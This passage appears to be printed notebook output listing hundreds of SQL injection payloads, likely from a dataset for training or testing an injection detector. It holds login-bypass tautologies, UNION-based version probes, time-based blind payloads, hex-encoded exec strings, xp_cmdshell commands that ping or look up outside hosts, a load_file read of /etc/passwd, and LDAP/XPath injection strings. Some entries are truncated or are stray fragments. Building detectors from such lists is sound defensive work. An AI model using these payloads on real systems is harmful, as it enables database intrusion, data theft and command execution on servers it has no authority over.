       " ' select * from users where id = 1 or @#\", = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \",&\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \",{\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \". ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \". ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \".,\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"..\" = 1 or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \".;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \".]\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\". union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\". union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\". union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\". union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \".#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \".[\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"._\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or @#\". = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\". = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \".%\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \".@\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \".{\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1 ( \" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1 ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1,\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \"1;\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1]\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"1 union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"1 union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"1 union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"1#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1[\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1_\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1&\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1{\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = \\'1\\' or \"\"<@ union select 1,version (  )  -- 1\\'',\n",
       " '&1c',\n",
       " ' ( s',\n",
       " ' ) s',\n",
       " ',s',\n",
       " '.s',\n",
       " '1s',\n",
       " ';s',\n",
       " '?s',\n",
       " 'UE1',\n",
       " 'UEf',\n",
       " 'UEs',\n",
       " 'UEv',\n",
       " 'c',\n",
       " 'n',\n",
       " 'ns',\n",
       " 'os',\n",
       " 's',\n",
       " 'v',\n",
       " '{s',\n",
       " ' select * from users where id = 1 or 1#\"; or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"; ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"; ) \" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \";,\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \";.\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \";1\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \";]\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"; union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"; union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"; union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"; union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \";#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \";[\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \";_\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or @#\"; = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"; = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \";&\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = \\'1\\' union select \";\"_,version (  )  -- 1\\'',\n",
       " ' select * from users where id = 1 or \";@\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \";{\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"? ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"] ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"?,\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = \\'1\\' union select $[\"],@@VERSION -- 1\\'',\n",
       " ' select * from users where id = 1 or \"].\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"]1\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \"?;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"??\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"?#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"?[\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"?_\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"?%\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = \\'1\\' union select \"?\"_,version (  )  -- 1\\'',\n",
       " ' select * from users where id = 1 or \"?@\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"]{\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' union select ||/1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' union select  ( \\\\ ) ,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select  ( \\\\. ) ,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1' union select \\\\,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select \\\\.,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select \\\\.#,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select \\\\.%1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1' union select 1a,banner from v$version where rownum = 1 -- 1'\",\n",
       " ' select * from users where id = \\'1\\' union select 1\"!\",banner from v$version where rownum = 1 -- 1\\'',\n",
       " \" select * from users where id = '1' union select \\\\#,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select $ .,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select $ _,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select $*$,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select +\\\\,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select +\\\\.,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select !<1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' union select +\\\\#,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select !<@,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' union select @ 1,version (  )  --  1'\",\n",
       " \" select * from users where id = '1'   union select null,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1' union select @ @1,version (  )  --  1'\",\n",
       " ' select * from users where id = 1 or \"\\\\#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"$ ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"_ ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = \\'1\\' union select \"[\"_,version (  )  -- 1\\'',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \"_;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"$?\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"$ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"$ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"$ union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"$ union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"$#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"$[\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"$_\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"$&\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"$@\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"_{\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' * ( \\\\ )  or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' +  ( \\\\ )  union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' +  ( \\\\. )  union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " ' select * from users where id = 1 or \"& ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"& ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"%,\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1'<@.. or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1'<@.. union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' <@.$ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' <@._ union select 1,version (  )  -- 1'\",\n",
       " ' select * from users where id = 1 or \"%.\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' + 1||1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1' *1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " ' select * from users where id = 1 or \"%1\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \"%;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"%?\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' + @<@# union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' *$ . or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' + $ . union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' *$ 1 or 1 = 1 -- 1'\",\n",
       " ' select * from users where id = 1 or \"%[\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' <@$_ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' <@$_ union select 1,version (  )  -- 1'\",\n",
       " ' select * from users where id = 1 or \"%_\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' + $+%\\\\ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' <@&1 or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' <@&1 union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' <@<@ union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' + $+%$ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' + $+*$ union select 1,@@VERSION -- 1'\",\n",
       " ' select * from users where id = 1 or \"%&\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' <@&@ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' %!<@ union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1'<@$$ union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' + @ ( 1 )  union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' + @ 1 union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' + @ 1! union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' + @ @1 union select 1,version (  )  -- 1'\",\n",
       " ' select * from users where id = 1 or \"%{\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"@ ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"@ ) \" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \"@;\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"@?\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"@ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"@ union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"@ union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"@#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"@%\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{ ( \" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{ ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{,\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{.\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{1\" = 1 or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \"{;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{?\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"{ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"{ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"{ union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"{ union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"{#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or @#\"{ = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or @#\"{ = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"{%\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{@\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{{\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + @`\\\\` union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 + @<1# union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 + @<@. union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 -@<@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 -@<@ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 -@<@ union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 + @<@# union select null,version (  )  -- 1',\n",
       " \"'-'\",\n",
       " \"' '\",\n",
       " \"'&'\",\n",
       " \"'^'\",\n",
       " \"'*'\",\n",
       " \"' or ''-'\",\n",
       " \"' or '' '\",\n",
       " \"' or ''&'\",\n",
       " \"' or ''^'\",\n",
       " \"' or ''*'\",\n",
       " '\"-\"',\n",
       " '\" \"',\n",
       " '\"&\"',\n",
       " '\"^\"',\n",
       " '\"*\"',\n",
       " '\" or \"\"-\"',\n",
       " '\" or \"\" \"',\n",
       " '\" or \"\"&\"',\n",
       " '\" or \"\"^\"',\n",
       " '\" or \"\"*\"',\n",
       " 'or true--',\n",
       " '\" or true--',\n",
       " \"' or true--\",\n",
       " '\" )  or true--',\n",
       " \"' )  or true--\",\n",
       " \"' or 'x' = 'x\",\n",
       " \"' )  or  ( 'x' )  =  ( 'x\",\n",
       " \"'  )  )   or   (  (  'x'  )  )   =   (  (  'x\",\n",
       " '\" or \"x\" = \"x',\n",
       " '\" )  or  ( \"x\" )  =  ( \"x',\n",
       " '\"  )  )   or   (  (  \"x\"  )  )   =   (  (  \"x',\n",
       " 'or 1 = 1',\n",
       " 'or 1 = 1-- ',\n",
       " 'or 1 = 1#',\n",
       " 'or 1 = 1/*',\n",
       " \"admin' --\",\n",
       " \"admin' #\",\n",
       " \"admin'/*\",\n",
       " \"admin' or '1' = '1\",\n",
       " \"admin' or '1' = '1'--\",\n",
       " \"admin' or '1' = '1'#\",\n",
       " \"admin' or '1' = '1'/*\",\n",
       " \"admin'or 1 = 1 or '' = '\",\n",
       " \"admin' or 1 = 1\",\n",
       " \"admin' or 1 = 1--\",\n",
       " \"admin' or 1 = 1#\",\n",
       " \"admin' or 1 = 1/*\",\n",
       " \"admin' )  or  ( '1' = '1\",\n",
       " \"admin' )  or  ( '1' = '1'--\",\n",
       " \"admin' )  or  ( '1' = '1'#\",\n",
       " \"admin' )  or  ( '1' = '1'/*\",\n",
       " \"admin' )  or '1' = '1\",\n",
       " \"admin' )  or '1' = '1'--\",\n",
       " \"admin' )  or '1' = '1'#\",\n",
       " \"admin' )  or '1' = '1'/*\",\n",
       " \"1234 ' AND 1 = 0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055\",\n",
       " 'admin\" --',\n",
       " 'admin\" #',\n",
       " 'admin\"/*',\n",
       " 'admin\" or \"1\" = \"1',\n",
       " 'admin\" or \"1\" = \"1\"--',\n",
       " 'admin\" or \"1\" = \"1\"#',\n",
       " 'admin\" or \"1\" = \"1\"/*',\n",
       " 'admin\"or 1 = 1 or \"\" = \"',\n",
       " 'admin\" or 1 = 1',\n",
       " 'admin\" or 1 = 1--',\n",
       " 'admin\" or 1 = 1#',\n",
       " 'admin\" or 1 = 1/*',\n",
       " 'admin\" )  or  ( \"1\" = \"1',\n",
       " 'admin\" )  or  ( \"1\" = \"1\"--',\n",
       " 'admin\" )  or  ( \"1\" = \"1\"#',\n",
       " 'admin\" )  or  ( \"1\" = \"1\"/*',\n",
       " 'admin\" )  or \"1\" = \"1',\n",
       " 'admin\" )  or \"1\" = \"1\"--',\n",
       " 'admin\" )  or \"1\" = \"1\"#',\n",
       " 'admin\" )  or \"1\" = \"1\"/*',\n",
       " '1234 \" AND 1 = 0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055',\n",
       " \"'sqlvuln\",\n",
       " \"'+sqlvuln\",\n",
       " 'sqlvuln;',\n",
       " ' ( sqlvuln ) ',\n",
       " \"a' or 1 = 1--\",\n",
       " '\"a\"\" or 1 = 1--\"',\n",
       " ' or a  =  a',\n",
       " \"a' or 'a'  =  'a\",\n",
       " '1 or 1 = 1',\n",
       " \"a' waitfor delay '0:0:10'--\",\n",
       " \"1 waitfor delay '0:0:10'--\",\n",
       " 'declare @q nvarchar  ( 4000 )  select @q  = ',\n",
       " '0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A',\n",
       " '0',\n",
       " '031003000270000',\n",
       " 'declare @s varchar ( 22 )  select @s  = ',\n",
       " '0x77616974666F722064656C61792027303A303A31302700 exec ( @s ) ',\n",
       " '0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ) ',\n",
       " 'declare @s varchar  ( 8000 )  select @s  =  0x73656c65637420404076657273696f6e',\n",
       " 'exec ( @s ) ',\n",
       " \"a'\",\n",
       " '?',\n",
       " \"' or 1 = 1\",\n",
       " 'â€˜ or 1 = 1 --',\n",
       " \"x' AND userid IS NULL; --\",\n",
       " \"x' AND email IS NULL; --\",\n",
       " \"anything' OR 'x' = 'x\",\n",
       " \"x' AND 1 =  ( SELECT COUNT ( * )  FROM tabname ) ; --\",\n",
       " \"x' AND members.email IS NULL; --\",\n",
       " \"x' OR full_name LIKE '%Bob%\",\n",
       " '23 OR 1 = 1',\n",
       " \"'; exec master..xp_cmdshell 'ping 172.10.1.255'--\",\n",
       " \"'\",\n",
       " \"' or '' = '\",\n",
       " \"' or 'x' = 'x\",\n",
       " ' or x = x',\n",
       " \"' )  or  ( 'x' = 'x\",\n",
       " '0 or 1 = 1',\n",
       " \"' or 0 = 0 --\",\n",
       " '\" or 0 = 0 --',\n",
       " 'or 0 = 0 --',\n",
       " \"' or 0 = 0 #\",\n",
       " ' or 0 = 0 #\"',\n",
       " 'or 0 = 0 #',\n",
       " \"' or 1 = 1--\",\n",
       " '\" or 1 = 1--',\n",
       " \"' or '1' = '1'--\",\n",
       " \"' or 1 --'\",\n",
       " 'or 1 = 1--',\n",
       " 'or 1 = 1',\n",
       " 'or 1 = 1 --',\n",
       " \"' or 1 = 1 or '' = '\",\n",
       " ' or 1 = 1 or \"\" = ',\n",
       " \"' or a = a--\",\n",
       " ' or a = a',\n",
       " \"' )  or  ( 'a' = 'a\",\n",
       " ' )  or  ( a = a',\n",
       " 'hi or a = a',\n",
       " 'hi or 1 = 1 --\"',\n",
       " \"hi' or 1 = 1 --\",\n",
       " \"hi' or 'a' = 'a\",\n",
       " \"hi' )  or  ( 'a' = 'a\",\n",
       " '\"hi\"\" )  or  ( \"\"a\"\" = \"\"a\"',\n",
       " \"'hi' or 'x' = 'x';\",\n",
       " '@variable',\n",
       " ',@variable',\n",
       " 'PRINT',\n",
       " 'PRINT @@variable',\n",
       " 'select',\n",
       " 'insert',\n",
       " 'as',\n",
       " 'or',\n",
       " 'procedure',\n",
       " 'limit',\n",
       " 'order by',\n",
       " 'asc',\n",
       " 'desc',\n",
       " 'delete',\n",
       " 'update',\n",
       " 'distinct',\n",
       " 'having',\n",
       " 'truncate',\n",
       " 'replace',\n",
       " 'like',\n",
       " 'handler',\n",
       " 'bfilename',\n",
       " \"' or username like '%\",\n",
       " \"' or uname like '%\",\n",
       " \"' or userid like '%\",\n",
       " \"' or uid like '%\",\n",
       " \"' or user like '%\",\n",
       " 'exec xp',\n",
       " 'exec sp',\n",
       " \"'; exec master..xp_cmdshell\",\n",
       " \"'; exec xp_regread\",\n",
       " \"t'exec master..xp_cmdshell 'nslookup www.google.com'--\",\n",
       " '--sp_password',\n",
       " '\\\\x27UNION SELECT',\n",
       " \"' UNION SELECT\",\n",
       " \"' UNION ALL SELECT\",\n",
       " \"' or  ( EXISTS ) \",\n",
       " \"'  ( select top 1\",\n",
       " \"'||UTL_HTTP.REQUEST\",\n",
       " '1;SELECT *',\n",
       " 'to_timestamp_tz',\n",
       " 'tz_offset',\n",
       " '<>\"\\'%; )  ( &+',\n",
       " \"' or 1 = 1\",\n",
       " '%27 or 1 = 1',\n",
       " ' $ ( sleep 50 ) ',\n",
       " \" 'sleep 50'\",\n",
       " 'char%4039%41%2b%40SELECT',\n",
       " '&apos; OR',\n",
       " \"'sqlattempt1\",\n",
       " ' ( sqlattempt2 ) ',\n",
       " '|',\n",
       " '%7C',\n",
       " '*|',\n",
       " '%2A%7C',\n",
       " '* ( | ( mail = *  )  )  ',\n",
       " '%2A%28%7C%28mail%3D%2A%29%29',\n",
       " '* ( | ( objectclass = *  )  )  ',\n",
       " '%2A%28%7C%28objectclass%3D%2A%29%29',\n",
       " ' ( ',\n",
       " '%28',\n",
       " ' ) ',\n",
       " '%29',\n",
       " '&',\n",
       " '%26',\n",
       " '!',\n",
       " '%21',\n",
       " \"' or 1 = 1 or '' = '\",\n",
       " \"' or '' = '\",\n",
       " \"x' or 1 = 1 or 'x' = 'y\",\n",
       " '/',\n",
       " '//',\n",
       " '//*',\n",
       " '*/*',\n",
       " \"a' or 3 = 3--\",\n",
       " '\"a\"\" or 3 = 3--\"',\n",
       " \"' or 3 = 3\",\n",
       " 'â€˜ or 3 = 3 --',\n",
       " \" )  or  ( 'x' = 'x\",\n",
       " ' or 1 = 1',\n",
       " \"; execute immediate 'sel' || 'ect us' || 'er'\",\n",
       " 'benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " 'update',\n",
       " '\";waitfor delay \\'0:0:__TIME__\\'--',\n",
       " '1 )  or pg_sleep ( __TIME__ ) --',\n",
       " '|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  ',\n",
       " '\"hi\"\" )  or  ( \"\"a\"\" = \"\"a\"',\n",
       " 'delete',\n",
       " 'like',\n",
       " '\" or sleep ( __TIME__ ) #',\n",
       " 'pg_sleep ( __TIME__ ) --',\n",
       " '* ( | ( objectclass = *  )  )  ',\n",
       " 'declare @q nvarchar  ( 200 )  0x730065006c00650063 ...',\n",
       " ' or 0 = 0 #',\n",
       " 'insert',\n",
       " '1 )  or sleep ( __TIME__ ) #',\n",
       " \" )  or  ( 'a' = 'a\",\n",
       " '; exec xp_regread',\n",
       " '*|',\n",
       " '@var select @var as var into temp end --',\n",
       " '1  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " 'asc',\n",
       " ' ( ||6 ) ',\n",
       " '\"a\"\" or 3 = 3--\"',\n",
       " '\" or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " '# from wapiti',\n",
       " ' or 0 = 0 --',\n",
       " \"1 waitfor delay '0:0:10'--\",\n",
       " \" or 'a' = 'a\",\n",
       " 'hi or 1 = 1 --\"',\n",
       " 'or a  =  a',\n",
       " ' UNION ALL SELECT',\n",
       " \" )  or sleep ( __TIME__ )  = '\",\n",
       " '  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " \"hi' or 'a' = 'a\",\n",
       " '0',\n",
       " '21 %',\n",
       " 'limit',\n",
       " ' or 1 = 1',\n",
       " ' or 2 > 1',\n",
       " '\"  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " 'PRINT',\n",
       " \"hi' )  or  ( 'a' = 'a\",\n",
       " ' or 3 = 3',\n",
       " \"  )  )  ;waitfor delay '0:0:__TIME__'--\",\n",
       " \"a' waitfor delay '0:0:10'--\",\n",
       " '1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ...',\n",
       " 'or 1 = 1',\n",
       " '1 or sleep ( __TIME__ ) #',\n",
       " 'or 1 = 1',\n",
       " ' and 1 in  ( select var from temp ) --',\n",
       " \" or '7659' = '7659\",\n",
       " \" or 'text'  =  n'text'\",\n",
       " ' --',\n",
       " \" or 1 = 1 or '' = '\",\n",
       " 'declare @s varchar  ( 200 )  select @s  =  0x73656c6 ...',\n",
       " 'exec xp',\n",
       " \"; exec master..xp_cmdshell 'ping 172.10.1.255'--\",\n",
       " '3.10E+17',\n",
       " '\" or pg_sleep ( __TIME__ ) --',\n",
       " \"x' AND email IS NULL; --\",\n",
       " '&',\n",
       " \"admin' or '\",\n",
       " \" or 'unusual'  =  'unusual'\",\n",
       " '//',\n",
       " 'truncate',\n",
       " '1 )  or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " '\\\\x27UNION SELECT',\n",
       " 'declare @s varchar ( 200 )  select @s  =  0x77616974 ...',\n",
       " 'tz_offset',\n",
       " 'sqlvuln',\n",
       " '\"  )  )  ;waitfor delay \\'0:0:__TIME__\\'--',\n",
       " '||6',\n",
       " 'or 1 = 1 --',\n",
       " '%2A%28%7C%28objectclass%3D%2A%29%29',\n",
       " 'or a = a',\n",
       " ' )  union select * from information_schema.tables;',\n",
       " 'PRINT @@variable',\n",
       " 'or isNULL ( 1/0 )  /*',\n",
       " '26 %',\n",
       " '\" or \"a\" = \"a',\n",
       " ' ( sqlvuln ) ',\n",
       " \"x' AND members.email IS NULL; --\",\n",
       " ' or 1 = 1--',\n",
       " ' and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,11 ...',\n",
       " '0x770061006900740066006F0072002000640065006C00 ...',\n",
       " \" 'sleep 50'\",\n",
       " 'as',\n",
       " '1  )  )   or pg_sleep ( __TIME__ ) --',\n",
       " '/**/or/**/1/**/ = /**/1',\n",
       " ' union all select @@version--',\n",
       " ',@variable',\n",
       " ' ( sqlattempt2 ) ',\n",
       " ' or  ( EXISTS ) ',\n",
       " \"t'exec master..xp_cmdshell 'nslookup www.googl ...\",\n",
       " ' $ ( sleep 50 ) ',\n",
       " '1 or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " \" or '' = '\",\n",
       " '||UTL_HTTP.REQUEST',\n",
       " ' or pg_sleep ( __TIME__ ) --',\n",
       " \"hi' or 'x' = 'x';\",\n",
       " '\" )  or sleep ( __TIME__ )  = \"',\n",
       " \" or 'whatever' in  ( 'whatever' ) \",\n",
       " \"; begin declare @var varchar ( 8000 )  set @var = ' ...\",\n",
       " \" union select 1,load_file ( '/etc/passwd' ) ,1,1,1;\",\n",
       " '0x77616974666F722064656C61792027303A303A313027 ...',\n",
       " 'exec ( @s ) ',\n",
       " ' )  or pg_sleep ( __TIME__ ) --',\n",
       " ' union select',\n",
       " ' or sleep ( __TIME__ ) #',\n",
       " ' select * from information_schema.tables--',\n",
       " \"a' or 1 = 1--\",\n",
       " \"a' or 'a'  =  'a\",\n",
       " 'declare @s varchar ( 22 )  select @s  = ',\n",
       " ' or 2 between 1 and 3',\n",
       " ' or a = a--',\n",
       " \" or '1' = '1\",\n",
       " '|',\n",
